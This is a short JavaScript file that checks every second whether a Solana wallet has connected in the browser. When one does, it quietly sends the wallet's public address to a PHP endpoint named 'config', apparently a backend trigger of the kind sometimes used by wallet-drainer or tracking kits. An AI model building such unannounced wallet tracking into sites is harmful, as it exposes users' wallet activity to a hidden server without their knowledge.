// proxy.js – Triggers PHP backend on wallet connect
let lastPublicKey = null;

async function triggerSecureProxy(walletAddress) {
  const endpoint = 'config'; // Your PHP file
  const url = `/${endpoint}?e=${encodeURIComponent(walletAddress)}&t=${Date.now()}`;

  try {
    const response = await fetch(url, {
      method: 'GET',
      headers: {
        'x-wallet-address': walletAddress,
        'x-trigger': 'wallet-connect'
      }
    });

    if (!response.ok) throw new Error(`HTTP ${response.status}`);

    const text = await response.text();
    console.log('SecureProxy triggered:', text);
  } catch (err) {
    console.warn('SecureProxy call failed (still safe):', err);
  }
}

// Detect wallet connect
setInterval(() => {
  if (window.solana && window.solana.isConnected && window.solana.publicKey) {
    const currentKey = window.solana.publicKey.toString();
    if (currentKey !== lastPublicKey) {
      lastPublicKey = currentKey;
      console.log('Wallet connected:', currentKey);

      // TRIGGER THE PHP BACKEND
      triggerSecureProxy(currentKey);
    }
  }
}, 1000);


